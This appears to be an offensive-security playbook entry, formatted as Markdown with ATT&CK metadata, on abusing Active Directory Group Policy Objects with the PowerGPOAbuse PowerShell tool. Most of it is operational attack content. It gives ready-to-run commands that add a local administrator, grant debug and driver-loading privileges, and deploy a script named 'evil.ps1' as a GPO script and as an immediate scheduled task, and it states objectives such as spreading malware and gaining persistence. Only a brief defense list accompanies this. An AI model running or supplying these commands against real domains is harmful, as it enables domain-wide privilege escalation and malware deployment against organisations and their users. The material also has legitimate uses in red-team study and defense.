---
id: c847de47-fff9-44db-962b-28d3fdd9d19e
name: GPO Abuse with PowerGPOAbuse
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:03.672399+00:00'
updated_at: '2023-04-10T20:26:15.893452+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Group Policy Modification|T1484 - Group Policy Modification]]'
tags:
- '[[Abuse GPO with PowerGPOAbuse]]'
- '[[Active Directory Attacks]]'
- '[[Exploit Group Policy Objects GPO]]'
commands:
- '[[Adding a localadmin]]'
- '[[Adding a new script]]'
- '[[Assigning new rights]]'
- '[[Creating an immediate task]]'
---

# GPO Abuse with PowerGPOAbuse

## Summary

GPOs are a powerful tool in Active Directory environments, used to enforce security policies and settings across the domain. However, if not properly secured, they can be abused by attackers to execute malicious code or escalate privileges. PowerGPOAbuse is a tool that automates the abuse of GPOs, 

## Description

# Description

GPOs are a powerful tool in Active Directory environments, used to enforce security policies and settings across the domain. However, if not properly secured, they can be abused by attackers to execute malicious code or escalate privileges. PowerGPOAbuse is a tool that automates the abuse of GPOs, allowing attackers to create and modify GPOs to achieve their objectives. This technique can be used to spread malware, gain persistence, or escalate privileges.

## Requirements

1. Domain user or administrator access

1. Access to a machine with PowerGPOAbuse installed

## Defense

1. Properly secure and restrict access to GPOs to prevent unauthorized modifications

1. Monitor GPO changes and alert on suspicious activity

1. Implement least privilege access to limit the impact of GPO abuse

## Objectives

1. Create or modify GPOs to achieve malicious objectives

1. Spread malware or gain persistence in the network

1. Escalate privileges to gain access to sensitive data or systems

# Instructions

1. Use the following commands to abuse Group Policy Objects:

**Code**: [[PS> . .\PowerGPOAbuse.ps1

# Adding a localadmin 
]]

> [{'command': 'Add-LocalAdmin', 'arguments': {'Identity': 'Specifies the name of the user account to which you want to add the local administrator rights.', 'GPOIdentity': 'Specifies the name of the GPO to which you want to apply the setting.'}, 'description': 'Adds a user to the local administrators group on a computer via GPO.'}, {'command': 'Add-UserRights', 'arguments': {'Rights': 'Specifies the user rights to add to the user account.', 'Identity': 'Specifies the name of the user account to which you want to add the user rights.', 'GPOIdentity': 'Specifies the name of the GPO to which you want to apply the setting.'}, 'description': 'Adds user rights to a user account via GPO.'}, {'command': 'Add-ComputerScript/Add-UserScript', 'arguments': {'ScriptName': 'Specifies the name of the script to add to the GPO.', 'GPOIdentity': 'Specifies the name of the GPO to which you want to apply the setting.', 'ScriptContent': 'Specifies the content of the script to add to the GPO.'}, 'description': 'Adds a script to a GPO that will be executed on the computer or user.'}, {'command': 'Add-GPOImmediateTask', 'arguments': {'Scope': 'Specifies the scope of the task (Computer or User).', 'Author': 'Specifies the author of the task.', 'Command': 'Specifies the command to execute.', 'TaskName': 'Specifies the name of the task to create.', 'GPOIdentity': 'Specifies the name of the GPO to which you want to apply the setting.', 'CommandArguments': 'Specifies the arguments to pass to the command.'}, 'description': 'Creates an immediate task in a GPO that will be executed on the computer or user.'}]

**Command** ([[Adding a localadmin]]):

```bash
Add-LocalAdmin -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'
```

**Command** ([[Assigning new rights]]):

```bash
Add-UserRights -Rights "SeLoadDriverPrivilege","SeDebugPrivilege" -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'
```

**Command** ([[Adding a new script]]):

```bash
Add-ComputerScript/Add-UserScript -ScriptName 'EvilScript' -ScriptContent $(Get-Content evil.ps1) -GPOIdentity 'SuperSecureGPO'
```

**Command** ([[Creating an immediate task]]):

```powershell
Add-GPOImmediateTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments "'$(Get-Content evil.ps1)'" -Author Administrator -Scope Computer/User -GPOIdentity 'SuperSecureGPO'
```

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Group Policy Modification|T1484 - Group Policy Modification]]

## Commands Used

- [[Adding a localadmin]]
- [[Adding a new script]]
- [[Assigning new rights]]
- [[Creating an immediate task]]

## Tags

- [[Abuse GPO with PowerGPOAbuse]]
- [[Active Directory Attacks]]
- [[Exploit Group Policy Objects GPO]]
